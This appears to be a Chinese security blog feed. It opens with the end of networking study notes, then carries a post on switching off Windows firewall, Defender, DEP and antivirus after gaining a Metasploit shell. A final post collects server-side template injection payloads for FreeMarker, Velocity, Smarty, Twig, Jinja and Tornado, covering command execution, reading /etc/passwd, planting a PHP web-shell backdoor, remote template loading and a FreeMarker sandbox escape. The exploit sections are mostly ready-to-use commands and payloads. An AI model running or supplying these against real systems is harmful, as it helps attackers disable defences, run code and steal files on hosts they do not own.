<p>15、“10Base-T”各数字字母代表的含义</p>
<p>“10”：表示传输速率为10Mb&#x2F;s。</p>
<p>“Base”:表示电缆上的信号是基带信号。</p>
<p>“T”：表示使用双绞线的最大长度是500m。</p>
<p>16、CSMA&#x2F;CD与TDM相比优缺点。</p>
<p>优势：CSMA&#x2F;CD是一种动态的媒体随机接入共享信道方式，TDM是一种静态的信道复用。CSMA&#x2F;CD是用户共享信道，TDM是为用户按时隙固定分配信道，当用户没有数据需要传送时，信道在用户时隙是浪费的，相比而言CSMA &#x2F;CD更灵活，提高信道的利用率。</p>
<p>劣势：CSMD&#x2F;CD当同时有用户使用信道时会发生碰撞，而TDM中用户在分配的时隙中不会与别的用户发生冲突。</p>
<p>对于局域网来说，连入信道的是相距较近的用户，通信信道带宽较宽，若使用TDM方式，用户在自己的时隙内没有数据发送的情况会更多，不利于信道的充分利用。</p>
<p>17、比特时间：传输1bit所需要的时间。这种时间单位与数据率密切相关，用来计量时延可以将时间与数据量联系起来,当计算比特时间需知道数据传输速率。10mb&#x2F;s和100mb&#x2F;s的争用期是512比特时间。</p>
<p>18、以太网的极限信道利用率与链接在以太网上的站点数无关；以太网利用率与连接在以太网上站点数有关。极限信道利用率是基于在各个站点都依次发送各自的数据，不会产生碰撞的以太网。而真实以太网传输数据是随机的。</p>
<p>19、集线器中每个站点共享带宽，交换机每个站点独占带宽。</p>
<p>20、以太网传输速率提高后需要解决哪些技术问题？</p>
<p>由于以太网传输速率提高，数据帧的发送时间按比例缩短。在局域网中进行传输会影响冲突的检测，所以需要减小最大电缆长度或增大帧的最小长度，才能有效地检测冲突。</p>
<p>21、以太网交换机是一个工作在数据链路层的多端口网桥。以太网交换机的每个端口都直接与一个单个主机或另一个集线器相连，并且工作在全双工方式。交换机能同时来连通多对的端口，使每一对相互通信的主机都能像独占通信媒体一样，进行无碰撞地传输数据。通信完成后就断开连接。</p>
<p>区别：以太网交换机工作在数据链路层，集线器工作在物理层 。集线器只对端口上进来的比特流进行复制转发，不能支持多端口的并发连接。</p>
<p>虚拟局域网的实现：由局域网网段构成的、与物理位置无关的逻辑组。每个VLAN都有一个标识符指名发送帧站点的VLAN。IEEE802.3ac标准在以太网帧格式中添加了4字节的VLAN标识来辨别所属VLAN站点。</p>
<p>22、网桥工作原理特点：</p>
<p>网桥的每个端口与一个网段相连。当网桥从端口接收主机传送的数据帧，先将其暂存在其缓冲区中，若此帧未出现差错，且目的数据帧MAC地址在网桥转发表中则通过查找转发表将其转发到对应的端口。若此帧出现差错则丢弃此帧。在转发表中未存在目的MAC地址的项目，则从非进入端口进行广播传送。当转发表中目的MAC地址对应端口与该帧进入端口相同时，则丢弃该帧。</p>
<p>网桥过滤了通信量，扩大了物理范围，提高了可靠性，可互连不同物理层、不同MAC子层和不同速率的局域网。增加了时延，对用户太多和通信量太大的局域网不合适。</p>
<p><strong>网桥与转发器不同</strong>：</p>
<p>网桥工作在数据链路层，而转发器工作在物理层。</p>
<p>网桥只转发未出现差错且目的MAC地址存在与转发表的数据帧。</p>
<p>网桥在转发数据帧前必须执行CSMA&#x2F;CD算法，转发器不用。</p>
<p>网桥和转发器都有扩展局域网的作用，网桥还能提高局域网的效率。</p>
<p><strong>网桥和以太网交换机区别</strong>：</p>
<p>以太网交换机通常有十几个端口，网桥一般只有2-4个端口，都工作在数据链路层。</p>
<p>网桥端口一般连接到局域网，以太网交换机每个接口都直接连接主机，交换机允许多对计算机同时通信，网桥允许每个网段上的计算机同时通信。以太网交换机是一个多端口的网桥。</p>
<p>网桥采用存储转发方式进行转发，以太网交换机采用直通方式转发。</p>
<p>以太网交换机采用专用的交换机构芯片，转发速度比网桥快。</p>
<p>23、如果站点仅仅接受数据，那么在转发表中没有这样的项目。当主机不知道目的地址位置时，会广播一条寻找目标MAC地址的询问帧，每个网桥会转发该帧使得达到每一个LAN，当目标主机收到该帧后会向源主机发送答复帧，这样途经的网桥就会记录目标MAC在转发表中。</p>
]]></content>
      <categories>
        <category>计网</category>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>-计算机网络 -数据链路层</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软 及防火墙关闭</title>
    <url>/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/</url>
    <content><![CDATA[<h1 id="杀软及防火墙关闭"><a href="#杀软及防火墙关闭" class="headerlink" title="杀软及防火墙关闭"></a>杀软及防火墙关闭</h1><hr>
<p>该文章记录使用msf工具进行后渗透模块，将目标主机的防火墙和杀毒软件进行关闭，方便后续上传后门和开启敏感端口</p>
<h2 id="windows自带防火墙服务"><a href="#windows自带防火墙服务" class="headerlink" title="windows自带防火墙服务"></a>windows自带防火墙服务</h2><h3 id="windows防火墙"><a href="#windows防火墙" class="headerlink" title="windows防火墙"></a>windows防火墙</h3><hr>
<p>关闭windows系统防火墙需进入目标主机shell和拥有管理员及以上权限才能执行，若权限不足需进行提权操作</p>
<p>首先使用msf反弹shell成功后，在meterpreter通道中进去目标主机shell，此时的权限为系统管理员权限</p>
<p><img src="/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110239586.png" alt="image-20211021110239586"><img src="/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110239705.png" alt="image-20211021110239705"></p>
<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110136651.png" class title="image-20211021110136651">



<p>使用netsh命令关闭windows防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110353082.png" class title="image-20211021110353082">



<p>目标主机之前的windows防火墙是开启的</p>
<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110536165.png" class title="image-20211021110536165">



<p>执行命令后被关闭</p>
<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110718801.png" class title="image-20211021110718801">



<h3 id="Denfender服务"><a href="#Denfender服务" class="headerlink" title="Denfender服务"></a>Denfender服务</h3><hr>
<p>Denfender是系统防火墙服务，可通过管理控制台命令停止该服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net stop windefend(服务名称)</span><br></pre></td></tr></table></figure>

<p>关闭windows Defender服务</p>
<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111629546.png" class title="image-20211021111629546">



<p>服务开启自启动</p>
<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111451170.png" class title="image-20211021111451170">



<p>服务停止</p>
<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111952028.png" class title="image-20211021111952028">



<h3 id="DEP-数据执行保护"><a href="#DEP-数据执行保护" class="headerlink" title="DEP(数据执行保护)"></a>DEP(数据执行保护)</h3><hr>
<p>DEP 可以防止应用运行用于暂存指令的那部分内存中的数据，从而保护电脑。 如果 DEP 发现某个运行此类数据的应用，它将关闭该应用并通知你</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bcdedit.exe /set &#123;current&#125; nx AlwaysOf</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021112310183.png" class title="image-20211021112310183">



<h2 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h2><hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run  killav</span><br><span class="line"></span><br><span class="line">run post/windows/manage/killava</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀处理</category>
      </categories>
      <tags>
        <tag>-内网渗透 -杀毒杀软</tag>
      </tags>
  </entry>
  <entry>
    <title>模板注入漏洞汇总</title>
    <url>/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="模板注入漏洞汇总"><a href="#模板注入漏洞汇总" class="headerlink" title="模板注入漏洞汇总"></a>模板注入漏洞汇总</h1><hr>
<p>之前在项目中碰到的FreeMark模板注入，才开始注意到模板注入漏洞，这里总结下模板注入漏洞汇总集合。</p>
<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在MVC的设计模式下，一般从 Model 层中读取数据，然后将数据传到 View 层渲染（渲染成 HTML 文件），而 View 层一般都会用到模板引擎。</p>
<p>模板引擎包含了各种参数，并能够由模板处理系统通过识别某些特定语法来替换这些参数的文档，用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)。</p>
<p>模板专注于如何展现数据，而在模板之外可以专注于要展示什么数据。模板引擎可以让网站程序实现界面与数据分离，业务代码与逻辑代码分离，这样提升了开发效率，良好的设计也使得代码重用变得更加容易。</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>模板引擎分为服务端和客户端：</p>
<p>1） <strong>客户端模板引擎</strong>：主要结合js实现html，一种是常规字符串模板引擎，包括doT.js、dust.js、mustache.js；</p>
<p>另一种是Dom模板引擎，包括vue.js、Angular.js、React.js等。</p>
<p>2） <strong>服务端模板引擎</strong>：由各服务端语言生成html返回客户端，主要包括： </p>
<p><strong>PHP</strong>：Smarty、Twig；</p>
<p><strong>Java</strong>：Freemarker、Velocity；</p>
<p><strong>Python</strong>：Jinja2、Tornado、Marko；</p>
<p><strong>Ruby</strong>：Slim、ERB；</p>
<p><strong>NodeJS</strong>：Jade等</p>
<h3 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h3><p><strong>后端模板引擎</strong></p>
<p>以JSP举例说明:</p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211112733437.png" class title="image-20220211112733437">



<p>看到上面的JSP代码，&lt;%%&gt;里面的为Java代码，为模板内容，而<div>标签里面的则为页面内容。当JSP代码在服务端被运行成Servlet Class后，<div>标签会被添加引号成为字符串，输出字符串内容在服务端运行。</div></div></p>
<p><strong>前端模板引擎</strong></p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211113850606.png" class title="image-20220211113850606">

<p>前端模板引擎依赖客户端，在浏览器渲染页面而不依赖服务端。</p>
<h2 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>任何一项新技术的引入同时也会带来新的攻击方式。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎本身会提供沙箱机制，但攻击者依然有许多手段绕过它。</p>
<p>看一个销售软件的例子，业务场景中要求发送大量的邮件给客户，并在每封邮件前插入问候语：</p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211115030363.png" class title="image-20220211115030363">

<p>这段代码的功能是，通过Twig模板引擎可以把输入转换成特定的HTML文件或者email格式进行相应输出。</p>
<p>很明显我们会发现代码存在xss，但问题不止如此，如果我们输入custom_email&#x3D;49，$output结果为49。</p>
<h3 id="漏洞检测步骤"><a href="#漏洞检测步骤" class="headerlink" title="漏洞检测步骤"></a>漏洞检测步骤</h3><p>客户端的模板注入（CSTI）只能XSS，而服务端模板注入（SSTI）则可能造成XSS、LFI和任意代码执行。</p>
<p>漏洞检测步骤分为:探测、判断、利用(读取、探索、攻击)</p>
<h4 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h4><p>1、文本类型</p>
<p>大多数的模板都支持文本的输入和输出：</p>
<p>如：freemarker&#x3D;Hello ${username}，smarty&#x3D;Hello {user.name}</p>
<p>探测方法有两种：</p>
<p>   1）XSS语句弹框测试；</p>
<p>   2）使用模板语法：</p>
<p>如reemarker&#x3D;Hello${7*7}，输出为Hello 49</p>
<p>2、代码类型</p>
<p>用户输入也可以放在模板语句中，通常作为变量名称，</p>
<p>如：personal_greeting&#x3D;username</p>
<p>这种情况下，XSS的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞，</p>
<p>如：personal_greeting&#x3D;username<tag></tag></p>
<h4 id="判断漏洞"><a href="#判断漏洞" class="headerlink" title="判断漏洞"></a>判断漏洞</h4><p>当检测存在模板漏洞后，我们需要判断具体的模板引擎，比如使用不同的字符进行判断通过返回的错误提示来判断目标模板类型。</p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211142308913.png" class title="image-20220211142308913">

<p>根据不同模板引擎的特性，通过输入上述payload可以快速判断出模板引擎。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>构造payload还是要根据各个模板特性来进行构造:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Template使用手册，一些基本的语法</span><br><span class="line"></span><br><span class="line">2.内建方法、函数、变量、过滤器</span><br><span class="line"></span><br><span class="line">3.插件、扩展及沙箱机制</span><br></pre></td></tr></table></figure>



<h3 id="模板分类"><a href="#模板分类" class="headerlink" title="模板分类"></a>模板分类</h3><p>下面针对多个模板的payload进行总结。</p>
<h4 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h4><p>FreeMaker 是 Java 下最受欢迎的模板引擎，在查看文档时我们发现有两个已发布的可接受用户输入并执行命令的类实现TemplateModel:</p>
<p><strong>&lt;#assigntest&#x3D;”freemarker.template.utility.Execute”?new()&gt;</strong></p>
<p><strong>&lt;#assignob&#x3D;”freemarker.template.utility.ObjectConstructor”?new()&gt;</strong></p>
<p>**&lt;#assign value&#x3D;”freemarker.template.utility.JythonRuntime”?new()&gt;**可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p>
<p><strong>payloads:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure>



<h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>  Velocity是另一种流行的Java模板语言，同样发现了两个可以利用的方法和属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ class.inspect（类/对象/串） 返回一个检查指定类或对象的新ClassTool实例</span><br><span class="line"></span><br><span class="line">$ class.type  返回正在检查的实际类</span><br></pre></td></tr></table></figure>

<p>可以使用$ class.type 链接$ class.inspect以获取对任意对象的引用。然后使用Runtime.exec（）在目标系统上执行任意shell命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$class.inspect(<span class="string">&quot;java.lang.Runtime&quot;</span>).type.getRuntime().exec(<span class="string">&quot;bad-stuff-here&quot;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set($x=&#x27;&#x27;)##</span><br><span class="line"></span><br><span class="line">#set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))##</span><br><span class="line"></span><br><span class="line">#set($chr=$x.class.forName(&#x27;java.lang.Character&#x27;))##</span><br><span class="line"></span><br><span class="line">#set($str=$x.class.forName(&#x27;java.lang.String&#x27;))##</span><br><span class="line"></span><br><span class="line">#set($ex=$rt.getRuntime().exec(&#x27;ls&#x27;))##</span><br><span class="line"></span><br><span class="line">$ex.waitFor()</span><br><span class="line"></span><br><span class="line">#set($out=$ex.getInputStream())##</span><br><span class="line"></span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>



<h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p> Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板，只运行 PHP 白名单里的函数，因此我们不能直接调用 system()。而文档表示可以通过 $smarty 来获取环境变量，我们又发现了 也可以使用getStreamVariable进行读取和写任意文件。</p>
<p>1）任意读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;ile:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>2）文件创建后门</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&quot;cmd&quot;]);?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h4><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。</p>
<p>Twig语法不仅简单，而且非常紧凑。下面是几个基本的变量绑定的例子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>



<p> Swig 和 Smarty 类似，不过我们不能用它调用静态方法。但它提供了 _self，提供了指向 Twig_Environment 的env 属性。Twig_Environment 其中的 setCache 方法则能改变 Twig 加载 PHP 文件的路径。这样就可以通过改变路径实现 RFI：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://xxx.xxx.xxx:xxxx&quot;)&#125;&#125;&#123;&#123;_self.env.loadtemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在 getFilter 里有危险函数 call_user_func。通过传递传递参数到该函数中，可以调用任意 PHP 函数，注册 exec 为 filter 的回调函数并调用造成命令执行。在下面的有效载荷中，命令id被执行后，将返回当前用户的id（Linux）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a>Jade</h4><p>Jade 是一款 Node.js 模板引擎，可以在Node.js等框架中使用，它有比较简单的语法和编写方式：</p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220216101423372.png" class title="image-20220216101423372">



<h4 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h4><p>Jinja是Python中一个流行的模板引擎，它与Django模板非常相似。不过，与Django模板相比，Jinsa可以轻松地在运行时动态使用。Django模板被设计为存储在静态文件中的动态视图。</p>
<p>下面是几个简单的表达式，用于演示Jinja的基本语法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//String</span><br><span class="line"></span><br><span class="line">&#123;&#123; message &#125;&#125;</span><br><span class="line"></span><br><span class="line">//Accessing an attribute</span><br><span class="line"></span><br><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line"></span><br><span class="line">//Accessing an attribute (alternative)</span><br><span class="line"></span><br><span class="line">&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</span><br></pre></td></tr></table></figure>



<p>涉及到的所有类型如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type &#x27;reversed&#x27;&gt; [...]</span><br></pre></td></tr></table></figure>



<p><strong>payload</strong></p>
<p>对象子类列表中索引40对应的元素是subclasses()[40],我们可以使用该类型来读取任意文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;,&quot;r&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">//The previous extension is analog to</span><br><span class="line"></span><br><span class="line">file(&quot;/etc/passwd&quot;,&quot;r&quot;).read()</span><br></pre></td></tr></table></figure>

<p>仅适用于Python 2.7(python2和python3中可能子类索引有区别)</p>
<p><strong>OS模块</strong>(Python 2.7)</p>
<p>先执行一个命令并将命令输出临时存储在temp文件夹中，然后，再使用另一个Jinja表达式来读取命令输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].system(&#x27;id &gt; /tmp/cmd&#x27;) &#125;&#125;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&quot;/tmp/cmd&quot;,&quot;r&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>Tornado模板是Tornado（一款流行的Python Web框架）中的一个引擎。针对该模版的练习非常简单，这表明：有时候仅需阅读库文档就能找到强大的功能。</p>
<p>基本数据绑定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123;userName&#125;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>pyload</strong></p>
<p>一个完整的payload，它用于导入os模块，并执行方法popen（即打开进程）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%import os%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Freemaker沙箱逃逸"><a href="#Freemaker沙箱逃逸" class="headerlink" title="Freemaker沙箱逃逸"></a>Freemaker沙箱逃逸</h3><p>值得一提的是，Freemarker确实提供了一种方法来限制模板中的类引用，接下来的练习将按照文档中的描述实现一个ClassResolver。</p>
<p>但从从2.3.17版本开始后使用Configuration.setNewBuiltinClassResolver(TemplateClassResolver)或者new_builtin_class_resolver设置来限制这个内置寒水可以访问哪些类。</p>
<p><strong>Freemarker中的沙盒</strong></p>
<p>Freemarker具有过滤哪些类允许访问的功能。例如，需要实现TemplateClassResolver类的子类，这个类将决定模板中的类引用是否被允许。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;#list .data_model?keys as key&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;$&#123;key&#125;&lt;/li&gt;</span><br><span class="line"></span><br><span class="line">&lt;/#list&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<p>或者:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;.data_model.keySet()&#125;</span><br></pre></td></tr></table></figure>



<p><strong>查找对类加载器的引用</strong></p>
<p>Classloader类的实例有可能给我们提供远程代码执行（RCE）权限。例如，类加载器可以从外部提供方法加载类（Java字节码）。</p>
<p>以下是可能返回Classloader的常见位置列表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Class.getClassLoader()</span><br><span class="line"></span><br><span class="line">java.lang.Thread.getCurrentClassLoader()</span><br><span class="line"></span><br><span class="line">java.lang.ProtectionDomain.getClassLoader()</span><br><span class="line"></span><br><span class="line">javax.servlet.ServletContext.getClassLoader()</span><br><span class="line"></span><br><span class="line">org.osgi.framework.wiring.BundleWiring.getClassLoader()</span><br><span class="line"></span><br><span class="line">org.springframework.context.ApplicationContext.getClassLoader()</span><br><span class="line"></span><br><span class="line">这些API将转换为以下Freemarker语法形式。</span><br><span class="line"></span><br><span class="line">//java.lang.Object.getClass() -&gt; java.lang.Class.getClassLoader()</span><br><span class="line"></span><br><span class="line">$&#123;any_object.class.classLoader&#125;</span><br><span class="line"></span><br><span class="line">//javax.servlet.ServletRequest -&gt; javax.servlet.ServletContext.getClassLoader()</span><br><span class="line"></span><br><span class="line">$&#123;request.servletContext.classLoader</span><br></pre></td></tr></table></figure>



<p><strong>并非所有的类加载器都是相同的</strong></p>
<p>尽管不同的类加载器可能有一个公共的子类，但是，它们的实现却差别很大。不同的Web容器（托管Java应用的Web服务器）在运行时将使用不同的类加载器。因此，我们需要调整我们的payload来锁定正确的目标。</p>
<h4 id="读取文件-x2F-目录列表"><a href="#读取文件-x2F-目录列表" class="headerlink" title="读取文件&#x2F;目录列表"></a><strong>读取文件&#x2F;目录列表</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign uri = classLoader.getResource(&quot;META-INF&quot;).toURI() &gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign url = uri.resolve(&quot;file:///etc/passwd&quot;).toURL() &gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign bytes = url.openConnection().inputStream.readAllBytes() &gt;</span><br><span class="line"></span><br><span class="line">$&#123;bytes&#125;</span><br></pre></td></tr></table></figure>



<h4 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h4><p>Oleksandr Mirosh和Alvaro Mu?oz 在他们的文章中详细介绍了Web容器特有的各种链条。这些容器包括Tomcat、Jetty、GlassFish、WebLogic和WebSphere。如果您想寻找Freemarker之外的沙盒的逃逸技术，这些都是一个很好的灵感来源。</p>
<p>然而，如果您的目标是利用当前的模板引擎，则存在一个通用的payload（也是来自上面提及的同一篇文章），适用于Freemarker 2.3.29以及更低版本（2020年3月以及修复了该漏洞）。为此，您需要在数据模型中找到一个作为对象的变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign owc=classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign dwf=owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign ec=classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;</span><br><span class="line"></span><br><span class="line">$&#123;dwf.newInstance(ec,null)(&quot;whoami&quot;)&#125;</span><br></pre></td></tr></table></figure>



<p>对数据模型中的所有变量进行暴力枚举</p>
